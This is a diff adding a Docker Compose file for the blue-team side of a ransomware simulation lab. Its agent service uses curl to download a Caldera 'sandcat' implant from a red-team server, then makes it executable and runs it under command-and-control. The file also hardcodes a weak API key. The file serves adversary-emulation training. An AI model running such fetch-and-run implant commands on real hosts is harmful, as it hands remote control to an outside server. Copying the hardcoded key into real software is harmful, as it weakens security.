@@ -1,0 +1,67 @@
+networks:
+  ransomsim_blue:
+    driver: bridge
+
+services:
+  agent:
+    image: alpine:latest
+    container_name: caldera_agent_blue
+    networks:
+      - ransomsim_blue
+    depends_on:
+      - api
+    restart: on-failure
+    environment:
+      # L'IP della macchina Red Team deve essere passato tramite variabile d'ambiente.
+      # Esempio: CALDERA_URL=http://192.168.1.100:8888 docker-compose -f docker-compose.blue.yaml up -d
+      - CALDERA_URL=${CALDERA_URL:-http://host.docker.internal:8888}
+    command: >
+      sh -c "apk add --no-cache curl &&
+      while true; do
+        HTTP_STATUS=$$(curl -s -o sandcat.go -w '%{http_code}' -X POST -H 'file:sandcat.go' -H 'platform:linux' $${CALDERA_URL}/file/download);
+        if [ \"$$HTTP_STATUS\" = '200' ] && [ -s sandcat.go ]; then
+          echo 'Agent downloaded successfully.';
+          break;
+        fi;
+        echo \"Waiting for Caldera at $${CALDERA_URL}... (status: $$HTTP_STATUS)\";
+        rm -f sandcat.go;
+        sleep 5;
+      done &&
+      chmod +x sandcat.go &&
+      ./sandcat.go -server $${CALDERA_URL} -group red_team"
+
+  api:
+    image: ghcr.io/astral-sh/uv:python3.10-bookworm-slim
+    container_name: api_blue
+    networks:
+      - ransomsim_blue
+    working_dir: /app
+    ports:
+      - "8000:8000"
+    environment:
+      - CALDERA_URL=${CALDERA_URL:-http://host.docker.internal:8888}
+      - CALDERA_API_KEY=ADMIN123
+    volumes:
+      - ../:/app
+    command: >
+      sh -c "uv sync &&
+      uv run uvicorn api.main:app --host 0.0.0.0 --port 8000"
+
+  frontend:
+    image: node:20-alpine
+    container_name: frontend_blue
+    networks:
+      - ransomsim_blue
+    working_dir: /app
+    ports:
+      - "5173:5173"
+    environment:
+      # Se il Red Team accede a questa interfaccia dal proprio browser, VITE_API_URL
+      # deve essere l'IP della macchina Blue Team e non localhost, altrimenti 
+      # il browser del Red Team cercherà l'API sul proprio localhost!
+      # Esempio: VITE_API_URL=http://<BLUE_TEAM_IP>:8000
+      - VITE_API_URL=${VITE_API_URL:-http://localhost:8000}
+    volumes:
+      - ../frontend:/app
+    command: >
+      sh -c "npm install && npm run dev -- --host 0.0.0.0"
